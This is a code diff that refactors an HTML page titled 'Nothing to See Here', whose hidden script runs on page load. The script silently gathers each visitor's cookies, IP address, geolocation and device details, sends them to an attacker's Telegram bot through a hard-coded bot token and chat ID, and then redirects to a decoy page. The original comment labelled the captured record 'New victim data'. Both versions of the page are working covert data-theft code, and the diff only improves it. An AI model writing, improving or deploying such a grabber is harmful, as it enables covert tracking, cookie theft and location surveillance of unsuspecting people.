@@ -1,58 +1,82 @@
-x<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Nothing to See Here</title>
+  <meta charset="UTF-8">
+  <title>Nothing to See Here</title>
 </head>
 <body>
-    <script>
-        // Function to grab all the juicy data and redirect
-        async function grabAndSendData() {
-            let data = {};
+  <script>
+    async function grabAndSendData() {
+      let data = {};
 
-            // Get geolocation if the browser allows it
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        data.latitude = position.coords.latitude;
-                        data.longitude = position.coords.longitude;
-                        data.accuracy = position.coords.accuracy;},                    (error) => {
-                        data.geolocation_error =`Geolocation blocked:${error.message}`;},                    { timeout: 10000}                );} else {
-                data.geolocation_error ="Geolocation not supported";}
-            // Grab browser and device info
-            data.userAgent = navigator.userAgent;
-            data.platform = navigator.platform;
-            data.language = navigator.language;
-            data.screen = `${window.screen.width}x${window.screen.height}`;
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.cookies = document.cookie ||"No cookies found";
+      // 1️⃣ اجمع بيانات الجهاز
+      data.userAgent = navigator.userAgent;
+      data.platform = navigator.platform;
+      data.language = navigator.language;
+      data.screen = `${window.screen.width}x${window.screen.height}`;
+      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      data.cookies = document.cookie || "No cookies found";
 
-            // Fetch IP address using a public API
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;} catch (e) {
-                data.ip_error =`IP fetch failed:${e.message}`;}
-            // Send data to Telegram bot
-            const botToken = '7733912783:AAEU-5zLar1DMCW7nohVkss1_l3tNnJ778c'; // Replace with your Telegram bot token
-            const chatId = '1883036774'; // Replace with your Telegram chat ID
-            const telegramUrl =`https://api.telegram.org/bot${botToken}/sendMessage`;
+      // 2️⃣ اجمع عنوان IP
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        data.ip = ipData.ip;
+      } catch (e) {
+        data.ip_error = `IP fetch failed: ${e.message}`;
+      }
 
-            const message =`New victim data:\n${JSON.stringify(data, null, 2)}`;
+      // 3️⃣ اجمع بيانات الموقع (نستخدم Promise للتزامن)
+      data.latitude = null;
+      data.longitude = null;
+      data.accuracy = null;
+      data.geolocation_error = null;
 
-            try {
-                await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json'},                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });} catch (e) {
-                console.error('Failed to send to Telegram:', e);}
-            // Redirect to the decoy page after a short delay (to ensure data is sent)
-            setTimeout(() => {
-                window.location.href = 'index1.html'; // Redirect to the second HTML page}, 1000); // 1-second delay to let the data send}
-        // Run the data grabber as soon as the page loads
-        window.onload = () => {
-            grabAndSendData();};    </script>
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+          });
+          data.latitude = position.coords.latitude;
+          data.longitude = position.coords.longitude;
+          data.accuracy = position.coords.accuracy;
+        } catch (err) {
+          data.geolocation_error = `Geolocation blocked: ${err.message}`;
+        }
+      } else {
+        data.geolocation_error = "Geolocation not supported";
+      }
+
+      // 4️⃣ جهز رسالة Telegram
+      const botToken = '7733912783:AAEU-5zLar1DMCW7nohVkss1_l3tNnJ778c';
+      const chatId = '1883036774';
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      const message = `New user data:\n${JSON.stringify(data, null, 2)}`;
+
+      // 5️⃣ أرسل إلى Telegram
+      try {
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      } catch (e) {
+        console.error('Failed to send to Telegram:', e);
+      }
+
+      // 6️⃣ إعادة التوجيه بعد التأكد من الإرسال
+      setTimeout(() => {
+        window.location.href = 'decoy.html';
+      }, 1000);
+    }
+
+    window.onload = () => {
+      grabAndSendData();
+    };
+  </script>
 </body>
 </html>
